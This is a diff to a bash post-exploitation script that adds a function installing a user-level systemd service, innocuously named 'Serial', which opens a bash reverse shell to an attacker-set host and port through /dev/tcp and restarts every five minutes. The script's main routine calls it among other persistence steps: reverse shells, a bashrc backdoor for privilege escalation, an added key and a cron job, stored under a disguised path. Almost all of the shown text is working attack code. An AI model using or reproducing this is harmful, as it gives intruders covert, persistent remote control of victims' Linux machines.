@@ -40,6 +40,33 @@ function add_key(){
 
 }
 
+function install_user_systemd(){
+if ! command -v systemctl &> /dev/null; then 
+	echo "[-] systemctl command not found" && return 1; 
+fi
+
+echo "[+] installing systemd timer for user $USER"
+mkdir -p $HOME/.config/systemd/user/
+
+cat << EOF > $HOME/.config/systemd/user/serial.service
+[Unit]
+Description=Serial
+
+[Service]
+ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/$LHOST/$PORT 0>&1'
+Restart=always
+RestartSec=300
+
+[Install]
+WantedBy=default.target
+EOF
+
+systemctl --user daemon-reload
+systemctl --user start serial.service
+systemctl --user enable serial.service
+
+}
+
 function install_systemd_timer(){
 if ! command -v systemctl &> /dev/null; then 
 	echo "[-] systemctl command not found" && return 1; 
@@ -131,6 +158,7 @@ echo "Adding persistences to $USER..."
 mkdir -p $HOME/.local/share 2>/dev/null
 REVSHELLSPATH="$HOME/.local/share/upowrd"
 reverse_shells
+install_user_systemd
 backdoor_bashrc_privesc
 add_key
 add_cronjob
